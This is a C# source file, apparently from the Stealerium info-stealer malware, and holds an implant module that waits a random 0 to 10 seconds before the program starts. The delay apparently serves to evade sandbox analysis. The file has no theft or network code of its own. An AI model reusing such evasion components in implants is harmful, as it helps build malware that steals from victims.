using System;
using System.Threading;
using Stealerium.Helpers;

namespace Stealerium.Modules.Implant
{
    internal sealed class StartDelay
    {
        // Define sleep time range in seconds
        private const int SleepMin = 0; // Minimum sleep time in seconds
        private const int SleepMax = 10; // Maximum sleep time in seconds

        /// <summary>
        /// Introduces a random delay before the program starts.
        /// </summary>
        public static void Run()
        {
            try
            {
                // Generate a random sleep time in milliseconds within the defined range
                var random = new Random();
                var sleepTimeInMilliseconds = random.Next(SleepMin * 1000, SleepMax * 1000);

                // Log the sleep time (in seconds for better readability)
                var sleepTimeInSeconds = sleepTimeInMilliseconds / 1000.0;
                Logging.Log($"StartDelay: Sleeping for {sleepTimeInSeconds:0.00} seconds.");

                // Delay execution
                Thread.Sleep(sleepTimeInMilliseconds);
            }
            catch (Exception ex)
            {
                // Log any potential errors that might occur during the sleep operation
                Logging.Log($"StartDelay: Error during delay. {ex.Message}");
            }
        }
    }
}
